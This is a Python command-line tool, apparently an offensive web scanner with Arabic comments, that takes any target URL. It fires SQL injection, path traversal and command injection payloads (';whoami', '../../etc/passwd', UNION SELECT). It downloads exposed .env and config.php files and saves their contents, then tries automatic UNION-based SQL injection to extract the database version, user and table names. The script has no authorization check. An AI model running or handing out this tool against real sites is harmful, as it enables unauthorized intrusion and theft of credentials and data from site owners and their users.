#!/usr/bin/env python3
import requests
import sys
import urllib.parse
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor

class ServerExploitScanner:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.vulnerabilities = []
        
    def test_sql_injection(self):
        """فحص ثغرات SQL Injection"""
        print(f"[*] Testing SQL Injection on {self.target}")
        
        # Parameters شائعة لفحص SQLi
        test_params = ['id', 'user', 'product', 'category', 'page', 'article']
        payloads = [
            "'",
            "1' OR '1'='1'--",
            "1' UNION SELECT 1,2,3--", 
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]
        
        for param in test_params:
            for payload in payloads:
                test_urls = [
                    f"{self.target}/?{param}={payload}",
                    f"{self.target}/product?{param}={payload}",
                    f"{self.target}/article?{param}={payload}"
                ]
                
                for test_url in test_urls:
                    try:
                        response = requests.get(test_url, timeout=8, verify=False)
                        
                        # علامات SQL Injection
                        sql_errors = [
                            "sql syntax", "mysql_fetch", "ora-", "microsoft odbc",
                            "postgresql", "sqlite", "warning:", "mysql_", "syntax error"
                        ]
                        
                        if any(error in response.text.lower() for error in sql_errors):
                            self.vulnerabilities.append({
                                'type': 'SQL Injection',
                                'url': test_url,
                                'payload': payload,
                                'risk': 'CRITICAL'
                            })
                            print(f"[!] SQL Injection Found: {test_url}")
                            return test_url
                            
                    except Exception as e:
                        continue
        
        print("[-] No SQL Injection found")
        return None
    
    def test_file_inclusion(self):
        """فحص ثغرات File Inclusion"""
        print(f"[*] Testing File Inclusion on {self.target}")
        
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../windows/win.ini", 
            "../../../../etc/hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd"
        ]
        
        params = ['file', 'page', 'load', 'path', 'doc']
        
        for param in params:
            for payload in lfi_payloads:
                test_url = f"{self.target}/?{param}={payload}"
                try:
                    response = requests.get(test_url, timeout=8, verify=False)
                    
                    # علامات نجاح LFI
                    if "root:" in response.text or "[extensions]" in response.text:
                        self.vulnerabilities.append({
                            'type': 'Local File Inclusion',
                            'url': test_url,
                            'payload': payload,
                            'risk': 'HIGH'
                        })
                        print(f"[!] LFI Found: {test_url}")
                        return test_url
                        
                except:
                    pass
        
        print("[-] No File Inclusion found")
        return None
    
    def test_command_injection(self):
        """فحص ثغرات Command Injection"""
        print(f"[*] Testing Command Injection on {self.target}")
        
        cmd_payloads = [
            "; whoami",
            "| whoami", 
            "&& whoami",
            "127.0.0.1; whoami",
            "`whoami`"
        ]
        
        # صفحات محتملة لـ Command Injection
        endpoints = [
            "/ping?ip=PAYLOAD",
            "/cmd?command=PAYLOAD", 
            "/exec?cmd=PAYLOAD",
            "/system?input=PAYLOAD"
        ]
        
        for endpoint in endpoints:
            for payload in cmd_payloads:
                test_url = f"{self.target}{endpoint.replace('PAYLOAD', urllib.parse.quote(payload))}"
                try:
                    response = requests.get(test_url, timeout=8, verify=False)
                    
                    # البحث عن مخرجات الأوامر
                    if "root" in response.text or "administrator" in response.text:
                        self.vulnerabilities.append({
                            'type': 'Command Injection',
                            'url': test_url,
                            'payload': payload,
                            'risk': 'CRITICAL'
                        })
                        print(f"[!] Command Injection Found: {test_url}")
                        return test_url
                        
                except:
                    pass
        
        print("[-] No Command Injection found")
        return None
    
    def test_sensitive_files(self):
        """فحص الملفات الحساسة"""
        print(f"[*] Scanning for sensitive files on {self.target}")
        
        sensitive_files = [
            "/.env",
            "/config.php",
            "/config.json", 
            "/.git/config",
            "/backup.sql",
            "/admin.php",
            "/phpinfo.php",
            "/.htaccess",
            "/web.config",
            "/robots.txt"
        ]
        
        found_files = []
        for file_path in sensitive_files:
            test_url = f"{self.target}{file_path}"
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200:
                    self.vulnerabilities.append({
                        'type': 'Sensitive File Exposure',
                        'url': test_url,
                        'risk': 'HIGH'
                    })
                    print(f"[!] Sensitive File Found: {test_url}")
                    found_files.append(test_url)
                    
                    # حفظ المحتوى إذا كان ملف حساس
                    if file_path in ['/.env', '/config.php']:
                        with open(f"found_{file_path.replace('/', '')}.txt", "w") as f:
                            f.write(response.text)
            except:
                pass
        
        return found_files
    
    def test_subdomain_takeover(self):
        """فحص إمكانية السيطرة على subdomains"""
        print(f"[*] Checking for subdomain takeover possibilities")
        
        domain = self.target.split('//')[-1].split('/')[0]
        base_domain = '.'.join(domain.split('.')[-2:])
        
        common_subdomains = [
            'admin', 'api', 'test', 'dev', 'staging', 'backup',
            'cpanel', 'ftp', 'mail', 'webmail', 'blog', 'shop'
        ]
        
        for sub in common_subdomains:
            subdomain = f"{sub}.{base_domain}"
            try:
                ip = socket.gethostbyname(subdomain)
                if ip != socket.gethostbyname(domain):
                    print(f"[+] Subdomain found: {subdomain} -> {ip}")
            except:
                pass
    
    def auto_exploit_sqli(self, vulnerable_url):
        """محاولة استغلال SQL Injection تلقائي"""
        print(f"[*] Attempting to exploit SQL Injection: {vulnerable_url}")
        
        # payloads لاستخراج البيانات
        exploit_payloads = [
            "1' UNION SELECT 1,version(),3--",
            "1' UNION SELECT 1,database(),3--",
            "1' UNION SELECT 1,user(),3--",
            "1' UNION SELECT 1,table_name,3 FROM information_schema.tables--"
        ]
        
        for payload in exploit_payloads:
            exploit_url = vulnerable_url.split("'")[0] + payload
            try:
                response = requests.get(exploit_url, timeout=10, verify=False)
                print(f"[*] Testing: {payload}")
                
                # البحث عن بيانات مفيدة في الresponse
                if "version()" not in response.text and len(response.text) > 100:
                    print(f"[!] Possible data extraction: {response.text[:200]}...")
                    
            except Exception as e:
                print(f"[-] Exploit failed: {e}")
    
    def generate_report(self):
        """توليد تقرير مفصل"""
        report = f"""
        SERVER VULNERABILITY SCAN REPORT
        ================================
        Target: {self.target}
        Scan Time: {time.ctime()}
        
        VULNERABILITIES FOUND:
        """
        
        for vuln in self.vulnerabilities:
            report += f"""
        Type: {vuln['type']}
        Risk: {vuln['risk']}
        URL: {vuln.get('url', 'N/A')}
        Payload: {vuln.get('payload', 'N/A')}
        {'='*50}
            """
        
        if not self.vulnerabilities:
            report += "\n        No critical vulnerabilities found."
        
        report += f"""
        
        RECOMMENDATIONS:
        - Implement input validation
        - Use parameterized queries
        - Restrict file access
        - Update server software
        """
        
        with open("server_scan_report.txt", "w") as f:
            f.write(report)
        
        print(f"[+] Scan report saved as server_scan_report.txt")
        return report
    
    def full_scan(self):
        """مسح كامل للموقع"""
        print(f"[*] Starting comprehensive server vulnerability scan for {self.target}")
        
        # تشغيل جميع الفحوصات بشكل متوازي
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [
                executor.submit(self.test_sql_injection),
                executor.submit(self.test_file_inclusion),
                executor.submit(self.test_command_injection),
                executor.submit(self.test_sensitive_files),
                executor.submit(self.test_subdomain_takeover)
            ]
            
            # انتظار انتهاء جميع الفحوصات
            for future in futures:
                future.result()
        
        # إذا وجدنا SQL Injection، نحاول الاستغلال
        sqli_url = None
        for vuln in self.vulnerabilities:
            if vuln['type'] == 'SQL Injection':
                sqli_url = vuln['url']
                break
        
        if sqli_url:
            self.auto_exploit_sqli(sqli_url)
        
        # توليد التقرير النهائي
        self.generate_report()
        
        print(f"\n[+] Scan completed! Found {len(self.vulnerabilities)} vulnerabilities")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 server_exploit_scanner.py TARGET_URL")
        print("Example: python3 server_exploit_scanner.py https://example.com")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = ServerExploitScanner(target)
    scanner.full_scan()

if __name__ == "__main__":
    main()